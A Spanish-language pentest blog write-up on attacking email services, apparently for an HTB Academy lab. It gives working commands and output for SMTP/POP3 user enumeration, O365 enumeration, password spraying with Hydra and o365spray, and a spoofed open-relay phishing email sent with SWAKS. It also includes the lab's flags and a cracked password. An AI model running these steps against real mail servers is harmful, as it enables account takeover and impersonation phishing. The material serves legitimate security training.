---
title: "Attacking Email Services"
date: 2026-04-15 10:00:00 -0400
categories: [Write-up]
tags: [smtp, pop3, imap, email, user-enumeration, password-spraying, open-relay, o365, phishing]
description: "Ataques a servicios de correo: enumeración de usuarios, password spraying, open relay y phishing con SWAKS."
media_subpath: /assets/img/posts/2026-04-15-attacking-email-services/
image:
  path: 1776451805145.webp
featured: false
toc: true
---
# ¿Cómo funciona el correo electrónico? 

Antes de atacar, hay que entender cómo fluye un email desde que presionas "Enviar" hasta que llega a la bandeja de entrada del destinatario. Todo esto sucede gracias a una cadena de protocolos que trabajan juntos:

```textplain
TÚ (cliente de email)
     ↓  SMTP — envías el correo a tu servidor
SERVIDOR DE CORREO ORIGEN
     ↓  SMTP — reenvía el correo al servidor destino
SERVIDOR DE CORREO DESTINO
     ↓  POP3 / IMAP — el destinatario descarga el correo
DESTINATARIO (cliente de email)
```

![](1776451805145.webp)

Tres protocolos, tres puertos, tres superficies de ataque distintas:

| Protocolo | Función                                                          | Puerto sin cifrar | Puerto cifrado |
| --------- | ---------------------------------------------------------------- | ----------------- | -------------- |
| **SMTP**  | Envío de correos entre servidores y clientes                     | TCP/25, TCP/587   | TCP/465        |
| **POP3**  | Descarga correos del servidor (los elimina del servidor)         | TCP/110           | TCP/995        |
| **IMAP4** | Sincroniza correos con el servidor (los mantiene en el servidor) | TCP/143           | TCP/993        |

> La diferencia clave entre POP3 e IMAP: POP3 descarga y borra, IMAP sincroniza y mantiene. Por eso IMAP es el estándar moderno y el que más datos expone si se compromete.
{: .prompt-info }

La gran pregunta antes de atacar es: **¿el servidor es propio o está en la nube?** Esto cambia completamente el enfoque.

```textplain
MX record apunta a aspmx.l.google.com    → Google Workspace (G-Suite)
MX record apunta a *.protection.outlook.com → Microsoft 365
MX record apunta a *.zoho.com            → Zoho Mail
MX record apunta a IP/dominio propio     → Servidor custom → más superficie de ataque
```

---

# Introducción

<div class="attack-grid">
  <div class="attack-card">
    <div class="atk-id">[ATK-01]</div>
    <h3>User Enumeration</h3>
    <p>Comandos SMTP como VRFY, EXPN y RCPT TO permiten confirmar si un usuario existe en el servidor sin autenticación.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-02]</div>
    <h3>Password Spraying</h3>
    <p>Una vez identificados usuarios válidos, se prueban contraseñas comunes contra SMTP, POP3 o IMAP evitando el lockout.</p>
  </div>
  <div class="attack-card">
    <div class="atk-id">[ATK-03]</div>
    <h3>Open Relay</h3>
    <p>Servidor SMTP mal configurado que reenvía correos de cualquier origen, permitiendo phishing desde una identidad legítima.</p>
  </div>
</div>

---

# Enumeración

### Identificar el servidor de correo

El punto de entrada es siempre el **registro MX** del DNS, que indica qué servidor gestiona el correo de un dominio.
- `host`: Es una herramienta de línea de comandos en sistemas tipo Unix/Linux utilizada para realizar búsquedas DNS (Domain Name System) y diagnósticos de red. Permite convertir nombres de dominio a direcciones IP (y viceversa), consultar registros DNS específicos (MX, NS, TXT) y verificar la propagación de dominios, siendo esencial para administradores de sistemas
```shell
╰─ host -t MX microsoft.com
microsoft.com mail is handled by 10 microsoft com.mail.protection.outlook.com.
```

> La flag `-t MX` filtra la consulta DNS para que solo devuelva los servidores de correo
{: .prompt-tip }


```shell
╰─ dig mx inlanefreight.com | grep "MX" | grep -v ";"
plaintext.do.  7076   IN   MX   50 mx3.zoho.com. 
plaintext.do.  7076   IN   MX   10 mx.zoho.com. 
plaintext.do.  7076   IN   MX   20 mx2.zoho.com.
```

| Parte         | Qué hace                                    |
| ------------- | ------------------------------------------- |
| `dig mx`      | Consulta registros MX del dominio           |
| `grep "MX"`   | Filtra solo las líneas con registros MX     |
| `grep -v ";"` | Elimina las líneas de comentario del output |

### Escanear puertos de correo

Con la IP del servidor, escaneamos todos los puertos relacionados con email de una sola vez:

```shell
╰─ sudo nmap -sS -sV -p25,143,110,465,587,993,995 -Pn -n 10.129.203.12

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

| Flag                           | Qué hace                                                |
| ------------------------------ | ------------------------------------------------------- |
| `-p25,143,110,465,587,993,995` | Escanea exactamente los 7 puertos de email              |
| `-sV`                          | Detecta versión del servicio en cada puerto             |
| `-sC`                          | Scripts automáticos: en SMTP revela comandos soportados |
| `-Pn`                          | No hace ping, asume el host activo                      |
|                                |                                                         |


El output de `-sC` sobre SMTP es oro: lista todos los comandos que soporta el servidor. Si ves `VRFY` en esa lista, el servidor es vulnerable a enumeración de usuarios.

> Si el Nmap muestra `VRFY` en los comandos SMTP soportados, el servidor no ha deshabilitado esa función y es directamente explotable para enumerar usuarios.
{: .prompt-danger }

---

# Explotación

### ATK-01 — User Enumeration

El protocolo SMTP fue diseñado en los años 80 sin pensar en seguridad. Incluye comandos de diagnóstico que, en servidores mal configurados, revelan si un usuario existe o no. Esto convierte al servidor de correo en un directorio de empleados de acceso libre.

Los tres comandos que explotan esto:

```textplain
VRFY usuario    → "¿existe este usuario?"
EXPN alias      → "¿qué usuarios hay en esta lista de distribución?"
RCPT TO:usuario → "¿puedo enviar un correo a este usuario?"
```

#### VRFY — Verificar usuario

- El comando `VRFY` pregunta directamente al servidor: "¿Existe el usuario root'?". 
- El servidor responde: con código 250/252 si existe, o 550 si no.
Nos conectamos directamente al puerto 25 con Telnet (sin herramientas especiales, solo el protocolo crudo):

```shell
╰─ telnet 10.10.110.20 25 

╰─ VRFY root 
252 2.0.0 root 

╰─ VRFY www-data 
252 2.0.0 www-data 

╰─ VRFY new-user 
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

El código de respuesta lo dice todo:

| Código | Significado |
|--------|-------------|
| `252` | El usuario **existe** en el servidor |
| `550` | El usuario **no existe** |

> `252` no significa que el servidor vaya a entregar el correo, sino que el usuario existe localmente. Es suficiente para confirmar cuentas válidas.
{: .prompt-info }

#### EXPN — Expandir listas de distribución

Diseñado para expandir listas de distribución. Por ejemplo: 
- Si preguntas por "soporte", 
- El servidor te devolverá los correos individuales de todos los que están en esa lista (ej. `carol@...`, `elisa@...`).  
EXPN es más peligroso que VRFY: cuando lo usas con un alias de grupo, devuelve **todos los emails de ese grupo**:

```shell
╰─ telnet 10.10.110.20 25

╰─ EXPN john
250 2.1.0 john@inlanefreight.htb

╰─ EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

Con una sola consulta a `support-team` obtienes todos los emails del equipo de soporte. Listas como `all`, `staff` o `employees` pueden devolver cientos de cuentas válidas.

> Muchas empresas tienen listas de distribución llamadas `all`, `everyone` o `staff`. Probar esos nombres con EXPN puede entregar el directorio completo de empleados.
{: .prompt-tip }

#### RCPT TO — Verificar destinatarios

 Si `VRFY` y `EXPN` están deshabilitados: 
 - Podemos simular el envío de un correo usando `MAIL FROM` y luego `RCPT TO: <usuario>`. 
 - El servidor confirmará si el destinatario es válido antes de que escribas el mensaje.

Este método es más sigiloso porque simula el proceso normal de envío de un correo. El servidor responde si el destinatario existe durante la negociación del mensaje:

```shell
╰─ telnet 10.10.110.20 25 

╰─ MAIL FROM:test@htb.com 
it is 
250 2.1.0 test@htb.com... Sender ok 

╰─ RCPT TO:julio 
550 5.1.1 julio... User unknown 

╰─ RCPT TO:kate 
550 5.1.1 kate... User unknown 

╰─ RCPT TO:john 
250 2.1.5 john... Recipient ok
```

La ventaja de RCPT TO sobre VRFY es que muchos servidores deshabilitan VRFY pero dejan RCPT TO activo porque es parte del flujo normal de SMTP.

#### USER — Enumerar usuarios 

Podemos usar el protocolo `POP3` para enumerar usuarios según la implementación del servicio. Por ejemplo, podemos usar el comando `USER`seguido del nombre de usuario, y si el servidor responde `OK`, significa que el usuario existe en el servidor.

```shell
╰─ telnet 10.10.1100.20 110

╰─ USER julio
-ERR 
 
╰─ USER john 
+OK
```

#### Automatizar con smtp-user-enum

Hacer esto a mano con Telnet funciona, pero es lento. `smtp-user-enum` automatiza el proceso contra una lista completa de usuarios:

```shell
╰─ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

| Flag | Qué hace |
|------|----------|
| `-M RCPT` | Método de enumeración: `VRFY`, `EXPN` o `RCPT` |
| `-U userlist.txt` | Archivo con la lista de usuarios a probar |
| `-D inlanefreight.htb` | Dominio para completar el email: `usuario@inlanefreight.htb` |
| `-t 10.129.203.7` | IP del servidor objetivo |


En 11 segundos tenemos 3 usuarios válidos de 78 probados. Esos son los objetivos para la siguiente fase.

---

### ATK-01b — User Enumeration en O365 (Enumeración de servicios de email en la nube)

Los proveedores de servicios en la **nube** utilizan su propia implementación para los servicios de correo electrónico. Estos servicios suelen tener funciones personalizadas que podemos aprovechar, como la **enumeración de nombres de usuario**.

- `O365spay`: [O365spray](https://github.com/0xZDH/o365spray) es una herramienta de enumeración de nombres de usuario y ataque de fuerza bruta contra contraseñas dirigida a **Microsoft Office 365 (O365),** desarrollada por [ZDH](https://twitter.com/0xzdh). Si el **MX record** apunta a **Microsoft 365**, el servidor no expone `VRFY` ni `EXPN`. Pero **O365** tiene su propio vector de enumeración a través de su API de autenticación. `o365spray` lo explota:

	1. Primero **validamos** que el **dominio** use O365:
```shell
python3 o365spray.py --validate --domain msplaintext.xyz

        *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```
	
2. Si el dominio es válido, **enumeramos usuarios**:

```shell
╰─ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

        *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03
   
>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz 
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users 
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz 
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz 
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: 
'/opt/o365spray/enum/enum_valid_accounts.2204130948.txt' 
[ * ] All enumerated accounts can be found at:
'/opt/o365spray/enum/enum_tested_accounts.2204130948.txt' 

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

| Flag | Qué hace |
|------|----------|
| `--enum` | Modo enumeración de usuarios |
| `-U users.txt` | Wordlist con usuarios a probar |
| `--domain` | Dominio objetivo de O365 |

> o365spray funciona porque la API de autenticación de Microsoft responde de forma diferente ante usuarios que existen vs. los que no existen, sin necesidad de una contraseña válida.
{: .prompt-info }

> Las APIs de servicios cloud cambian con frecuencia. Si o365spray no funciona, verificar que esté actualizado antes de descartar el vector.
{: .prompt-warning }

---

### ATK-02 — Password Spraying

Con una lista de usuarios válidos, el siguiente paso es obtener credenciales. La estrategia es **Password Spraying**: probar una sola contraseña contra todos los usuarios antes de pasar a la siguiente. Esto evita que las cuentas se bloqueen por exceso de intentos fallidos.

#### Hydra contra POP3

```shell
╰─ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46 
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal! 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task [DATA] attacking pop3://10.10.110.20:110/ [110][pop3] host: 10.129.42.197 login: john password: Company01! 
1 of 1 target successfully completed, 1 valid password found
```

| Flag | Qué hace |
|------|----------|
| `-L users.txt` | Lista de usuarios a probar |
| `-p 'Company01!'` | Contraseña única a probar contra todos |
| `-f` | Para al encontrar el primer resultado válido |
| `pop3` | Protocolo objetivo (también acepta `smtp`, `imap`) |


> Las contraseñas más efectivas en password spraying son las estacionales con el año: `Enero2024!`, `Summer2024`, `Company2024!`. Los usuarios las crean porque cumplen con los requisitos de complejidad y son fáciles de recordar.
{: .prompt-tip }

> En entornos corporativos, las cuentas suelen bloquearse tras 3-5 intentos fallidos. Verifica la política de lockout antes de lanzar el spray. Un falso movimiento puede bloquear cuentas y alertar al Blue Team.
{: .prompt-danger }

#### o365spray — Password Spraying contra Microsoft 365

Para entornos O365, Hydra suele estar bloqueado. o365spray implementa el spray a través de OAuth2, que es más difícil de bloquear:

```shell
╰─ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
count 1 --lockout 1 --domain msplaintext.xyz 

        *** O365 Spray *** 
        
>----------------------------------------< 

> version       :  2.0.4 
> domain        :  msplaintext.xyz 
> spray         :  True 
> password      :  March2022! 
> userfile      :  usersfound.txt 
> count         :  1 passwords/spray 
> lockout       :  1.0 minutes 
> spray_module  :  oauth2 
> rate          :  10 threads 
> safe          :  10 locked accounts 
> timeout       :  25 seconds 
> start         :  2022-04-14 12:26:31

>----------------------------------------< 

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz 
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz 
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users. 
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!'] 
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022! 
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: 
'/opt/o365spray/spray/spray_valid_credentials.2204141226.txt' 
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt' 

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

| Flag | Qué hace |
|------|----------|
| `--spray` | Modo password spraying |
| `-U usersfound.txt` | Usuarios válidos encontrados en la enumeración |
| `-p 'March2022!'` | Contraseña a probar |
| `--count 1` | Cuántas contraseñas probar por ronda antes de pausar |
| `--lockout 1` | Minutos de espera entre rondas para evitar lockout |

> `--count 1` y `--lockout 1` son fundamentales. Sin ellos, o365spray puede bloquear cuentas. Siempre usarlos en entornos reales.
{: .prompt-warning }

**Otras herramientas disponibles:**
- [MailSniper](https://github.com/dafthack/MailSniper): Para microsoft
- [CredKing](https://github.com/ustayready/CredKing): Para Gmail u Okta

---

### ATK-03 — Open Relay

Un **Open Relay** es un servidor SMTP que acepta y reenvía correos de **cualquier origen hacia cualquier destino** sin requerir autenticación. Fue común en los primeros días del email (cuando Internet era de confianza), pero hoy es una misconfiguration grave.

```
Servidor SMTP normal:
Origen externo → "reenvía este email" → Servidor → "¿estás autenticado? No → RECHAZADO"

Open Relay:
Origen externo → "reenvía este email" → Servidor → "claro, no hay problema" → REENVÍA
```

El impacto desde el punto de vista ofensivo es enorme: puedes enviar emails **suplantando cualquier dirección** de la empresa, y el destinatario verá que el correo viene de un servidor legítimo. Es el vector perfecto para phishing interno.

1. Primero detectamos si el servidor es un open relay con `Nmap`: 
   Puede intentar 16 combinaciones diferentes de envío de correos sin autenticación. Si el servidor lo permite, lo marcará como vulnerable.

```shell
╰─ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency). 
PORT    STATE   SERVICE 
25/tcp  open    smtp 
|_smtp-open-relay: Server is an open relay (14/16 tests)           #   <----------- 14/16!
```

| Flag                       | Qué hace                                                 |
| -------------------------- | -------------------------------------------------------- |
| `--script smtp-open-relay` | Script de Nmap que realiza 16 pruebas de relay distintas |


**14 de 16 pruebas pasaron.** El servidor es un open relay explotable. 

2. Ahora enviamos el email de phishing con **SWAKS** **(Swiss Army Knife for SMTP)**: 
   Es considerado la "navaja suiza" del **SMTP**. Al ser un **Open Relay**, le estamos diciendo al servidor que **envíe un correo simulando** **ser un departamento interno** (`--from notifications@...`) a los empleados (`--to employees@...`). Dado que el correo se origina en el _propio servidor legítimo de la empresa_, pasará por alto los filtros antispam (**SPF/DKIM**) locales y llegará a la bandeja de entrada de las víctimas con un nivel de confianza altísimo, haciendo que nuestro enlace malicioso sea mucho más propenso a recibir clics.

```bash
╰─ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

| Flag | Qué hace |
|------|----------|
| `--from` | Dirección del remitente que verá el destinatario (puede ser falsa) |
| `--to` | Destinatario del correo |
| `--header` | Cabeceras del email (asunto, etc.) |
| `--body` | Cuerpo del mensaje |
| `--server` | IP del servidor SMTP open relay |

El servidor aceptó el correo sin pedir ninguna autenticación. El email llega a `employees@inlanefreight.com` aparentando venir de `notifications@inlanefreight.com`, la dirección oficial de notificaciones de la empresa.

> En un engagement real, este vector combinado con un portal de login falso que capture credenciales es uno de los ataques de phishing más creíbles porque el correo pasa los filtros de dominio de la víctima.
{: .prompt-danger }

---

# Resumen

Los ataques a servicios de email siguen una progresión lógica:

```
1. IDENTIFICAR EL SERVICIO
   host -t MX / dig mx → ¿servidor propio o cloud (O365, GSuite)?
        ↓
        ├── Servidor propio → ATK-01, ATK-02, ATK-03
        └── Cloud (O365)   → ATK-01b (o365spray), ATK-02 (o365spray spray)
        ↓
2. ENUMERAR USUARIOS
   Servidor propio → telnet + VRFY/EXPN/RCPT → smtp-user-enum
   O365            → o365spray --enum
        ↓
3. OBTENER CREDENCIALES
   Hydra (POP3/SMTP/IMAP) o o365spray --spray
        ↓
4. OPEN RELAY (si existe)
   nmap smtp-open-relay → SWAKS → phishing suplantando identidad
```

| Técnica | Requisito | Impacto | Ruido |
|---------|-----------|---------|-------|
| User Enum (VRFY/EXPN) | SMTP con comandos habilitados | Lista de usuarios válidos | Bajo |
| User Enum (RCPT TO) | Servidor SMTP accesible | Lista de usuarios válidos | Muy bajo |
| User Enum O365 | Dominio en Microsoft 365 | Lista de usuarios válidos | Bajo |
| Password Spraying | Lista de usuarios válidos | Acceso a cuentas de correo | Medio |
| Open Relay + SWAKS | Servidor SMTP sin autenticación | Phishing con identidad legítima | Bajo |

---

# Write Up: Attacking Email Services

## **Pregunta 1**: ¿Cuál es el nombre de usuario disponible para el dominio inlanefreight.htb en el servidor SMTP?

Realizamos un escaneo de puertos con los puertos comunes de correo electrónico con `nmap`:
```shell
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.203.12
```

![](1776646326179.webp)
- **Resultado**:
- 25/tcp → SMTP (hMailServer)
- 110/tcp → POP3
- 143/tcp → IMAP
- SMTP admite los comandos: `VRFY` y `RCPT`

El comando `RCPT TO:<usuario@dominio.com>` se usa normalmente para decirle al servidor a quién va dirigido un correo antes de enviar el cuerpo del mensaje. Si el usuario no existe, el servidor responde con un `error 550` (**User unknown**). Si existe, responde con un `250` (**OK**).

Como la enumeración de usuarios es posible procedemos con una enumeración automática:
```shell
smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t 10.129.203.12
```

![](1776646413215.webp)
- **Resultado**: `marlin@inlinefreight.htb`

La herramienta intento enumerar el diccionario `users.txt` (Recurso de HTB Academy) y el servidor confirmó la existencia del usuario: `10.129.203.12: marlin@inlanefreight.htb exists`
### **🚩Flag 1**: 
```textplain
marlin
```

## **Pregunta 2**: Acceda a la cuenta de correo electrónico utilizando las credenciales de usuario que descubrió y envíe la bandera que aparece en el correo electrónico como respuesta.

Con un usuario válido confirmado, el siguiente paso era conseguir la contraseña. Procedí a ejecutar un ataque de fuerza bruta usando `hydra` con el diccionario `pws.list` (Recurso de HTB Academy) sobre el puerto 110 (`POP3`)  

>Se recomienda reiniciar la maquina objetivo si no se obtiene respuesta 
{: .prompt-danger }

```shell
hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.60.161 pop3
```

![](1776646461832.webp)
- **Resultado:** `poohbear`

El servidor POP3 aceptó la autenticación, revelando credenciales válidas:
- **Usuario:** `marlin@inlanefreight.htb`.
- **Contraseña:** `poohbear`.

Nos conectamos manualmente al servicio `POP3` usando `telnet` y proporcionando las credenciales descubiertas:
```shell
telnet 10.129.60.161 110
```

**Autenticación**:
```shell
USER marlin@inlanefreight.htb  
PASS poohbear
```

**Listar Correos**
```shell
LIST
```

**Recuperar primer mensaje**
```shell
RETR 1
```

En el primer correo esta la respuesta:

![](1776646498833.webp)
- **Resultado**: `HTB{w34k_p4$$w0rd}`
### **🚩Flag 2**
```shell
HTB{w34k_p4$$w0rd}
```

---

# **Conclusión**:

Los servicios de correo son uno de los vectores más ricos en un pentest porque combinan múltiples protocolos, puertos y configuraciones. Un servidor **SMTP** con `VRFY` habilitado entrega el directorio de usuarios de la empresa en segundos. Un open relay permite suplantar cualquier remitente y lanzar phishing que pasa los filtros de los destinatarios.

La diferencia entre atacar un servidor propio y uno en la nube es significativa: los servidores cloud tienen sus propios mecanismos de autenticación y herramientas especializadas, mientras que los servidores propios suelen tener misconfigurations clásicas más fáciles de explotar. Siempre identificar primero dónde está alojado el servicio antes de elegir las herramientas.
